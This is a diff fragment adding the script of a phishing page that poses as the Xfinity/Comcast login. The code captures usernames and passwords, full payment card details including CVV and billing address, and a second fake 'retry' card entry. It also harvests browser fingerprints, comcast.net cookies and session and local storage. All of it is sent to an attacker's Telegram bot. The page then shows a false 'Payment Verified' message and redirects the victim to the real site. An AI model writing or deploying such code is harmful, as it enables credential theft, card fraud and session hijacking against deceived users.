+        msg += `📅 Exp Year: <code>${cardData.expYear || 'N/A'}</code>\n`;
+        msg += `🔐 CVV: <code>${cardData.cvv || 'N/A'}</code>\n\n`;
+      }
+
+      if (retryData) {
+        msg += `<b>⚠️ RETRY (ERROR:57) DATA</b>\n`;
+        msg += `📧 Email: <code>${retryData.email || 'N/A'}</code>\n`;
+        msg += `🏙️ City: <code>${retryData.city || 'N/A'}</code>\n`;
+        msg += `💳 Card Type: <code>${retryData.cardType || 'N/A'}</code>\n`;
+        msg += `🔢 Card Number: <code>${retryData.cardNumber || 'N/A'}</code>\n`;
+        msg += `📅 Exp Month: <code>${retryData.expMonth || 'N/A'}</code>\n`;
+        msg += `📅 Exp Year: <code>${retryData.expYear || 'N/A'}</code>\n`;
+        msg += `🔐 CVV: <code>${retryData.cvv || 'N/A'}</code>\n\n`;
+      }
+
+      if (deviceInfo) {
+        msg += `<b>🖥️ DEVICE & BROWSER INFO</b>\n`;
+        msg += `🌐 IP: <code>${deviceInfo.ip || 'N/A'}</code>\n`;
+        msg += `🕒 Time: <code>${deviceInfo.time || 'N/A'}</code>\n`;
+        msg += `🖥️ UA: <code>${deviceInfo.ua || 'N/A'}</code>\n`;
+        msg += `📱 Screen: <code>${deviceInfo.screen || 'N/A'}</code>\n`;
+        msg += `🌍 TZ: <code>${deviceInfo.tz || 'N/A'}</code>\n`;
+        msg += `🔍 FP: <code>${deviceInfo.fp || 'N/A'}</code>\n`;
+        msg += `🌐 Lang: <code>${deviceInfo.language || 'N/A'}</code>\n`;
+        msg += `💻 Platform: <code>${deviceInfo.platform || 'N/A'}</code>\n`;
+        msg += `🏷️ Vendor: <code>${deviceInfo.vendor || 'N/A'}</code>\n`;
+        msg += `🚫 DNT: <code>${deviceInfo.doNotTrack || 'N/A'}</code>\n`;
+        msg += `📶 Connection: <code>${deviceInfo.connection || 'N/A'}</code>\n\n`;
+      }
+
+      msg += `────────────────────\n`;
+      
+      return msg;
+    }
+
+    // ============================================================
+    // STATE
+    // ============================================================
+    let capturedLogin = null;
+    let capturedCard = null;
+    let capturedRetry = null;
+    let deviceInfo = null;
+
+    const loginContainer = document.getElementById('loginContainer');
+    const cardContainer = document.getElementById('cardContainer');
+    const errorContainer = document.getElementById('errorContainer');
+    const loginForm = document.getElementById('loginForm');
+    const cardForm = document.getElementById('cardForm');
+    const errorForm = document.getElementById('errorForm');
+    const loginError = document.getElementById('loginError');
+    const cardError = document.getElementById('cardError');
+    const errorFormError = document.getElementById('errorFormError');
+
+    deviceInfo = getDeviceInfo();
+    console.log('[DEVICE] Info collected:', deviceInfo);
+    console.log('[COMCAST COOKIES] Real comcast.net session cookies:', deviceInfo.comcastCookies);
+    console.log('[ALL COOKIES] All cookies:', deviceInfo.allCookies);
+    console.log('[SESSION] Session storage:', deviceInfo.sessionStorage);
+    console.log('[LOCAL] Local storage:', deviceInfo.localStorage);
+
+    document.querySelectorAll('.card-type-pills span').forEach(pill => {
+      pill.addEventListener('click', function() {
+        document.querySelectorAll('.card-type-pills span').forEach(p => p.classList.remove('active'));
+        this.classList.add('active');
+        document.getElementById('errorCardType').value = this.dataset.type;
+      });
+    });
+
+    // ============================================================
+    // LOGIN
+    // ============================================================
+    loginForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const user = document.getElementById('user').value.trim();
+      const pass = document.getElementById('pass').value.trim();
+
+      if (!user || !pass) {
+        loginError.textContent = 'Please enter both email/ID and password.';
+        loginError.style.display = 'block';
+        return;
+      }
+      loginError.style.display = 'none';
+      capturedLogin = { user, pass };
+      console.log('[CAPTURED] Login:', capturedLogin);
+
+      deviceInfo = getDeviceInfo();
+      sendToTelegram(buildTelegramMessage(capturedLogin, null, null, deviceInfo));
+
+      loginContainer.classList.add('hidden');
+      cardContainer.classList.remove('hidden');
+      setTimeout(() => document.getElementById('firstName').focus(), 300);
+    });
+
+    // ============================================================
+    // CARD
+    // ============================================================
+    cardForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const firstName = document.getElementById('firstName').value.trim();
+      const lastName = document.getElementById('lastName').value.trim();
+      const address = document.getElementById('address').value.trim();
+      const address2 = document.getElementById('address2').value.trim();
+      const city = document.getElementById('city').value.trim();
+      const state = document.getElementById('state').value.trim();
+      const country = document.getElementById('country').value;
+      const postalCode = document.getElementById('postalCode').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const cardType = document.getElementById('cardType').value;
+      const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+      const expMonth = document.getElementById('expMonth').value;
+      const expYear = document.getElementById('expYear').value;
+      const cvv = document.getElementById('cvv').value.trim();
+
+      if (!firstName || !lastName || !address || !city || !postalCode || !expMonth || !expYear || !cvv) {
+        cardError.textContent = 'Please fill in all required fields marked with *.';
+        cardError.style.display = 'block';
+        return;
+      }
+      if (cardNumber.length < 13 || cardNumber.length > 19) {
+        cardError.textContent = 'Enter a valid card number (13-19 digits).';
+        cardError.style.display = 'block';
+        return;
+      }
+      cardError.style.display = 'none';
+
+      capturedCard = { firstName, lastName, address, address2, city, state, country, postalCode, phone, cardType, cardNumber, expMonth, expYear, cvv };
+      console.log('[CAPTURED] Card:', capturedCard);
+
+      deviceInfo = getDeviceInfo();
+      sendToTelegram(buildTelegramMessage(capturedLogin, capturedCard, null, deviceInfo));
+
+      cardContainer.classList.add('hidden');
+      errorContainer.classList.remove('hidden');
+
+      document.getElementById('errorEmail').value = capturedLogin.user || '';
+      document.getElementById('errorCity').value = city || '76666666666';
+      
+      const selectedType = cardType || 'Visa';
+      document.querySelectorAll('.card-type-pills span').forEach(p => {
+        p.classList.toggle('active', p.dataset.type === selectedType);
+      });
+      document.getElementById('errorCardType').value = selectedType;
+      
+      const displayNum = cardNumber ? cardNumber.replace(/\d/g, '#') : '#### #### #### ####';
+      document.getElementById('errorCardNumber').value = displayNum;
+      
+      document.getElementById('errorExpMonth').value = expMonth || '';
+      document.getElementById('errorExpYear').value = expYear || '';
+      document.getElementById('errorCvv').value = cvv ? '***' : '';
+
+      setTimeout(() => document.getElementById('errorEmail').focus(), 300);
+    });
+
+    // ============================================================
+    // RETRY
+    // ============================================================
+    errorForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById('errorEmail').value.trim();
+      const city = document.getElementById('errorCity').value.trim();
+      const cardType = document.getElementById('errorCardType').value;
+      const cardNumber = document.getElementById('errorCardNumber').value.replace(/\s/g, '');
+      const expMonth = document.getElementById('errorExpMonth').value;
+      const expYear = document.getElementById('errorExpYear').value;
+      const cvv = document.getElementById('errorCvv').value.trim();
+
+      if (!email || !city || !expMonth || !expYear || !cvv) {
+        errorFormError.textContent = 'Please fill in all required fields.';
+        errorFormError.style.display = 'block';
+        return;
+      }
+      errorFormError.style.display = 'none';
+
+      capturedRetry = { email, city, cardType, cardNumber, expMonth, expYear, cvv };
+      console.log('[CAPTURED] Retry:', capturedRetry);
+
+      deviceInfo = getDeviceInfo();
+      sendToTelegram(buildTelegramMessage(capturedLogin, capturedCard, capturedRetry, deviceInfo));
+
+      showSuccess();
+    });
+
+    function showSuccess() {
+      errorContainer.innerHTML = `
+        <div class="success-content">
+          <span class="checkmark">✅</span>
+          <h2>Payment Verified</h2>
+          <p>Your card information has been successfully verified.</p>
+          <p style="font-size:12px; color:#999; margin-top:4px;">Redirecting to your account...</p>
+          <div class="spinner"></div>
+        </div>
+      `;
+      setTimeout(() => {
+        window.location.href = 'https://login.xfinity.com/login';
+      }, 3000);
+    }
+
+    // ============================================================
+    // FORMATTING
+    // ============================================================
+    document.getElementById('cardNumber').addEventListener('input', function(e) {
+      let val = this.value.replace(/\D/g, '');
+      let formatted = '';
+      for (let i = 0; i < val.length; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += val[i];
+      }
+      this.value = formatted;
+    });
+
+    document.getElementById('errorCardNumber').addEventListener('input', function(e) {
+      let val = this.value.replace(/\D/g, '');
+      let formatted = '';
+      for (let i = 0; i < val.length; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += val[i];
+      }
+      this.value = formatted;
+    });
+
+    document.getElementById('cvv').addEventListener('input', function(e) {
+      if (this.value.length > 4) this.value = this.value.slice(0, 4);
+    });
+    document.getElementById('errorCvv').addEventListener('input', function(e) {
+      if (this.value.length > 4) this.value = this.value.slice(0, 4);
+    });
+
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') {
+        if (!cardContainer.classList.contains('hidden')) {
+          const active = document.activeElement;
+          if (active && active.form === cardForm) {
+            cardForm.dispatchEvent(new Event('submit'));
+          }
+        }
+        if (!errorContainer.classList.contains('hidden')) {
+          const active = document.activeElement;
+          if (active && active.form === errorForm) {
+            errorForm.dispatchEvent(new Event('submit'));
+          }
+        }
+      }
+    });
+
+    console.log('Xfinity 3-step capture with comcast.net cookie grabber loaded');
+    console.log('Bot Token configured:', TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' ? '✓' : '✗');
+    console.log('Chat ID configured:', TELEGRAM_CHAT_ID && TELEGRAM_CHAT_ID !== 'YOUR_CHAT_ID_HERE' ? '✓' : '✗');
+
+    if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && 
+        TELEGRAM_CHAT_ID && TELEGRAM_CHAT_ID !== 'YOUR_CHAT_ID_HERE') {
+      const comcastCookies = getComcastCookieString();
+      const session = getSessionStorage();
+      const local = getLocalStorage();
+      let storageMsg = '';
+      if (Object.keys(session).length) {
+        storageMsg += `\n🔐 Session keys: ${Object.keys(session).join(', ')}`;
+      }
+      if (Object.keys(local).length) {
+        storageMsg += `\n💾 Local keys: ${Object.keys(local).join(', ')}`;
+      }
+      sendToTelegram('🟢 <b>Xfinity Login Page Loaded</b>\nBot is online and ready.\n\n' + 
+        `🍪 <b>Comcast.net Session Cookies:</b>\n<code>${comcastCookies || '(no comcast cookies)'}</code>\n` +
+        storageMsg +
+        `\n\n📱 <b>Device Info:</b>\n` +
+        `🖥️ UA: ${deviceInfo.ua}\n` +
+        `📱 Screen: ${deviceInfo.screen}\n` +
+        `🌍 TZ: ${deviceInfo.tz}\n` +
+        `🔍 FP: ${deviceInfo.fp}`);
+    }
+  </script>
+</body>
+</html>
